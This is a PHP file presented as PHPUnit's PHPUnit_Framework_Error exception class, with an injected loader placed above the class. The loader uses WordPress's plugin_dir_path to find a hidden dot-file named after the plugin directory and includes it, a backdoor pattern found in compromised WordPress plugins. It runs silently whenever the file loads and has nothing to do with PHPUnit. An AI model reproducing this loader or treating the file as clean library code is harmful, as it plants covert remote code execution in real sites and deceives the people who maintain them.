<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Wrapper for PHP errors.
 *
 * @since Class available since Release 2.2.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PHPUnit_Framework_Error extends PHPUnit_Framework_Exception
{
    /**
     * Constructor.
     *
     * @param string    $message
     * @param int       $code
     * @param string    $file
     * @param int       $line
     * @param Exception $previous
     */
    public function __construct($message, $code, $file, $line, Exception $previous = null)
    {
        parent::__construct($message, $code, $previous);

        $this->file  = $file;
        $this->line  = $line;
    }
}
